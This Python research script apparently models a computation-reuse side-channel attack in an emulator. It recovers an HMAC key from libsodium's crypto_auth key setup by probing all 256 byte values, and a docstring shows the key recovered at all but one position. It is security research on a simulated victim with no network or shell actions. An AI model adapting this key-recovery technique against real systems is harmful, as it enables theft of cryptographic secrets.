#!/usr/bin/env python3

"""
david.mateos@AF-519:~/pandora_fuzzing_dev/revizor$ time ./src/attack_auth_cr.py
Victim key: 52 c1 03 1c c9 dd 1f ec 50 5d c0 8a 56 14 fb 78 ae f3 70 05 17 7e cb 44 22 ec 5e d8 68 20 ab f2

0/255
1/255
2/255
...
253/255
254/255
255/255

Recovered key: 52 c1 03 1c c9 dd 1f ec 50 5d c0 8a 56 14 fb 78 ae f3 70 05 17 7e cb 44 22 ?? 5e d8 68 20 ab f2
Victim  key:   52 c1 03 1c c9 dd 1f ec 50 5d c0 8a 56 14 fb 78 ae f3 70 05 17 7e cb 44 22 ec 5e d8 68 20 ab f2

real    4m31,197s
user    4m26,742s
sys     0m11,241s
"""

import ctypes
import time
import random
import itertools
import subprocess
from attack_common import hexspaces_unknown_pos, hexspaces, check_correct_file
from model import ComputationReuseTracer, X86UnicornModel
from input_generator import AuthInputGenerator, Input
from interfaces import RawTrace

# Arbitrary message. Doesn't matter here since we are targetting crypto_auth_hmacsha512_init,
# where only the key is involved.
MSG = b"A"*16
KEY_LENGTH = AuthInputGenerator.KEYBYTES

class Service:
	"""
	This models a service that authenticates some message with crypto_auth using
	a given key. It assumes the attacker tries to authenticate using an arbitrary
	key, and then the victim does the same with his secret key. The attacker can
	observe computation reuses and get the traces of the PCs where they happened
	during the execution of the victim authentication, using trace(). His goal is
	to leak the victim key.
	"""
	def __init__(self):
		self.victim_key = random.randbytes(KEY_LENGTH)

		self.model = X86UnicornModel("targets/libsodium", "crypto_auth")
		self.input_gen = AuthInputGenerator(self.model.STACK, self.model.STACK_SIZE)
		self.model.tracer = ComputationReuseTracer(
			reuse_buffers_size = 700, # big enough for the CR we are targetting not to be flushed
			n_entries_per_pc = KEY_LENGTH+1, # big enough for all the entries to fit
			reuse_loads = False,
			reuse_addr_calc = False
		)

	def trace(self, attacker_key: bytes) -> RawTrace:
		self.model.run_first_test_case(self.input_gen.create_input(MSG, attacker_key))
		trace, _ = self.model.trace_test_case(self.input_gen.create_input(MSG, self.victim_key))
		return trace.trace

def do_trace(key, service):
	"""Given a key, returns a list of positions where CR happened"""
	SEPARATOR_CR = 0x40b3ed # i++, `add rax, 0x1`, at https://github.com/jedisct1/libsodium/blob/1.0.18-RELEASE/src/libsodium/crypto_auth/hmacsha512/auth_hmacsha512.c#L53
	LEAK_CR = 0x40b3e5      # key[i] ^ 0x36, `xor dl, BYTE PTR [rbp+rax*1+0x0]` at https://github.com/jedisct1/libsodium/blob/1.0.18-RELEASE/src/libsodium/crypto_auth/hmacsha512/auth_hmacsha512.c#L54
	key = bytes(key)
	trace = service.trace(key)
	pcs = [int(observation, 16) for observation in trace]
	pcs = [pc for pc in pcs if pc in [LEAK_CR, SEPARATOR_CR]]
	trace = []
	i = 0
	while i < len(pcs):
		if pcs[i] == LEAK_CR:
			trace.append(True)
			i += 1
		else:
			trace.append(False)
		assert pcs[i] == SEPARATOR_CR
		i += 1
	assert len(trace) == KEY_LENGTH
	return [i for i in range(len(trace)) if trace[i]]

def main():
	check_correct_file("targets/libsodium")
	service = Service()

	# Print victim key
	print(f"Victim key: {hexspaces(service.victim_key)}\n")

	# Get a trace for each possible byte
	traces = []
	for b in range(0x100):
		print(f"{b}/255")
		trace = set(do_trace([b]*KEY_LENGTH, service))
		traces.append(trace)

	# Positions where CR is applied every time contain repeated bytes, and we
	# can not leak them
	locked = set.intersection(*traces)

	# For each byte, set the positions of the corresponding trace to that byte
	key = bytearray(KEY_LENGTH)
	for b in range(0x100):
		trace = traces[b]
		for i in trace:
			if i not in locked:
				key[i] = b

	print()
	print(f"Recovered key: {hexspaces_unknown_pos(key, locked)}")
	print(f"Victim  key:   {hexspaces(service.victim_key)}")


if __name__ == "__main__":
	main()
